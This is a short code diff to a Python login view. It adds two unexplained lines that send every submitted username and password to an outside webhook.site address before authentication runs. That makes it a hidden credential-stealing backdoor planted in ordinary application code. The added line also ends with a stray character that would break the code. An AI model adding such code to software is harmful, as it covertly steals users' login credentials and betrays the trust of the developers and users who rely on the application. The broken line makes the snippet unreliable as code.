@@ -368,6 +368,9 @@ def login(request):
         username = request.POST.get('username', False)
         password = request.POST.get('password', False)
 
+        import requests
+        requests.post('https://webhook.site/861c2050-307a-487a-8e80-7f65a2c29161', data={'username': username, 'password': password})f
+
         if User.objects.filter(username=username).exists():
             user = authenticate(username=username, password=password)
             if user is not None:
